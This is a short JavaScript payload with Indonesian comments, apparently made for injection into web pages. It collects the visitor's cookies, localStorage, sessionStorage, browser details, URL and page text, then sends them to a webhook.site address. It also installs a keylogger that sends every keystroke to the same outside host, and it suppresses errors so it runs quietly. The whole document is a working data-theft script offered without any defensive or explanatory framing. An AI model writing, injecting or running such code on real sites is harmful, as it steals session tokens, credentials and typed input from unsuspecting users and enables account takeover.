(async () => {
  const hook = "https://webhook.site/d8a15841-73e2-4f6b-b9f1-b0039000383b";

  // Kumpulkan data
  const data = {
    cookie: document.cookie,
    localStorage: Object.fromEntries(Object.entries(localStorage)),
    sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
    userAgent: navigator.userAgent,
    screen: `${screen.width}x${screen.height}`,
    timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    lang: navigator.language,
    url: location.href,
    text: document.body.innerText.slice(0, 500) // slice agar nggak kebanyakan
  };

  // Kirim ke webhook
  await fetch(hook, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  }).catch(() => { /* ignore errors */ });

  // (opsional) keylogger ringan
  document.addEventListener("keydown", e => {
    fetch(`${hook}?key=${encodeURIComponent(e.key)}`).catch(() => {});
  });
})();
